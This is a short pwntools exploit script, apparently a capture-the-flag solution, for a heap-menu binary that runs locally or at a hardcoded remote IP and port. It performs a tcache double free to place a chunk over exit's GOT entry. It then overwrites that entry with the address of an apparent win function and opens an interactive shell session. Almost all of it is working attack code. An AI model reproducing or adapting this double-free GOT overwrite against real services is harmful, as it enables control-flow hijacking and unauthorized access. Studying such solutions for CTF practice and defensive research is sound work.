#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./bin')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./bin', gdbscript=gs)
    if args.REMOTE:
        return remote('165.227.92.222', 4455)
    else:
        return process('./bin')
r = start()
index = 0
def allocate(size, data):
    global index
    index += 1
    r.sendline(b"1")
    r.sendlineafter(b"size :", str(size))
    r.sendlineafter(b"data :", data)
    r.recvuntil(b">")
    return index - 1


def delete(index):
    r.sendline(b"2")
    r.sendlineafter(b"index :", str(index))
    r.recvuntil(b">")

#========= exploit here ===================

a = allocate(0x18, b"AAAAA")
b = allocate(0x18, b"BBBBB")

delete(a)
delete(a)
#print(hex(elf.sym.win))
#
allocate(0x18, p64(0x404070)) #exit en got
#sleep(0.5)
allocate(0x18, b"AAAAA" )
#sleep(0.5)
allocate(0x18, p64(0x401296))

r.sendline(b"3")



#========= interactive ====================
r.interactive()
